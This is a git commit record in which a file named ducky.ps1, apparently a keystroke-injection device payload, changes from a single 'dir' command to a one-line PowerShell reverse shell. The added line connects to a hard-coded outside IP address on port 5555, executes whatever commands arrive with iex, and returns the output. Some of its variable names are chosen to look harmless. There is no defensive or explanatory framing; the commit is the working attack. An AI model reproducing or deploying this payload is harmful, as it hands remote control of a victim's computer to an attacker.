0747501d4c172d2138cf118c093297687fb86072
vladstanoiu <55551799+vladstanoiu@users.noreply.github.com>
2022-11-14 23:17:27 +0200

    Update ducky.ps1

--- ducky.ps1
+++ ducky.ps1
@@ -1,1 +1,1 @@
-dir
+$RnDoMM = New-Object Net.Sockets.TCPClient('79.114.55.34',5555);$cevalung = $RnDoMM.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $cevalung.Read($bytes, 0, $bytes.Length)) -ne 0){;$nothingtoseehere = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$dbackhere = (iex $nothingtoseehere 2>&1 | Out-String );$dbackhere2  = $dbackhere + '> ';$back2back = ([text.encoding]::ASCII).GetBytes($dbackhere2);$cevalung.Write($back2back,0,$back2back.Length);$cevalung.Flush()};$RnDoMM.Close()
